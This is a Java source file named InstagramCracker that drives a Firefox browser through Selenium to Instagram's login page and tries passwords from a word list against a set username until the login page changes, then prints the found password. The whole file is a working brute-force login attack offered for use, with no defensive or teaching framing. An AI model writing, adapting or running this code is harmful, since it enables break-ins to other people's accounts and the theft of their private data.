import com.google.common.annotations.VisibleForTesting;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.util.Scanner;

public class InstagramCracker {

    static String password = "";
    @Test
    public  void getInstagramPass() {
        Scanner sc = new Scanner    (System.in);
        ReadFile reader = new ReadFile();
        System.setProperty("webdriver.gecko.driver", "D:\\geckodriver.exe");
        WebDriver driver = new FirefoxDriver();
        driver.get("https://www.instagram.com/accounts/login/");

        //String username = sc.nextLine();
        String username = "username";

        int j = 0;
        int counter = 0;
        do {
            try {
                Thread.sleep( 1000);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
            }
            driver.findElement(By.xpath("/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[1]/div/label/input")).clear();
            driver.findElement(By.xpath("/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[1]/div/label/input")).sendKeys(username);
            driver.findElement(By.xpath("/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[2]/div/label/input")).clear();
            driver.findElement(By.xpath("/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[2]/div/label/input")).sendKeys(reader.passwords.get(j));
            driver.findElement(By.xpath("/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[2]/div/label/input")).sendKeys(Keys.RETURN);
            //driver.findElement(By.xpath("/html/body/div[1]/section/main/div/div/div[1]/div/form/div[1]/div[3]/button/div")).click();
            WebElement UsernameArea = driver.findElement(By.name("username"));
                counter++;
            try {
                Thread.sleep( 1000);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
            }
                if(driver.findElement(By.xpath("/html/body/div[1]/section/main/div/div/div[2]/div")).getText().contains("Don't have an account?")) {
                    System.out.println("wemfwkefm");
                }
                else {
                    password  = reader.passwords.get(j);
                    break;
                }

                j++;
        }
        while (j <= reader.passwords.size()-1);



    }
    public static void main(String[] args) {

        InstagramCracker obj = new InstagramCracker();
        obj.getInstagramPass();
        System.out.println("Password is:" + password);
    }

}
